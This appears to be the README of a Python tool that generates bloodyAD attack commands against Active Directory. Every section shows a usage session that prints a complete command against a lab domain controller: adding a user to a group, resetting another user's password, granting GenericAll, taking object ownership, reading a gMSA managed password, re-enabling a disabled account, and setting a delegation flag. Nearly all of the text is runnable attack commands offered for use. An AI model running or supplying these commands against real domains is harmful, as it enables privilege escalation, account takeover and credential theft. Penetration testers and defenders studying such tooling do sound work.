# autobloodyAD
## USAGE

### Retrieve User Information
```
➜  autobloodyAD python3 autobloodyAD.py 
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 1
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe   
Enter password: passw0rd
Enter target_username: h.jack

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd get object h.jack
```
### Add User To Group
```
➜  autobloodyAD python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 2
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe
Enter password: passw0rd
Enter group_name: Core Staff
Enter member_to_add: h.jack

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd add groupMember Core Staff h.jack
```
### Change Password
```
➜  autobloodyAD python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 3
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe
Enter password: passw0rd
Enter target_username: h.jack
Enter new_password: NewPassword123!

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd set password h.jack NewPassword123!
```
### Give User GenericAll Rights
```
➜  autobloodyAD python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 4
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe
Enter password: passw0rd
Enter DN: DN
Enter target_username: h.jack

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd add genericAll DN h.jack
```
### WriteOwner
```
➜  autobloodyAD python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 5
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe
Enter password: passw0rd 
Enter target_group: Core Staff 
Enter target_username: h.jack

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd set owner Core Staff h.jack
```
### ReadGMSAPassword
```
➜  autobloodyAD python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 6
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe
Enter password: passw0rd
Enter target_username: h.jack

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd get object h.jack --attr msDS-ManagedPassword
```
### Enable a Disabled Account
```
➜  autobloodyAD python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 7
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe
Enter password: passw0rd
Enter target_username: h.jack

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd remove uac h.jack -f ACCOUNTDISABLE
```
### Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
```
➜  autobloodyAD python3 autobloodyAD.py
=== BloodyAD Attack Command Generator ===
Choose an attack vector:
1. Retrieve User Information
2. Add User To Group
3. Change Password
4. Give User GenericAll Rights
5. WriteOwner
6. ReadGMSAPassword
7. Enable a Disabled Account
8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag
Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): 8
Enter dc: dc.lab.local
Enter domain: lab.local
Enter username: j.doe
Enter password: passw0rd
Enter target_username: h.jack

Generated Commands:
bloodyAD --host dc.lab.local -d lab.local -u j.doe -p passw0rd add uac h.jack -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

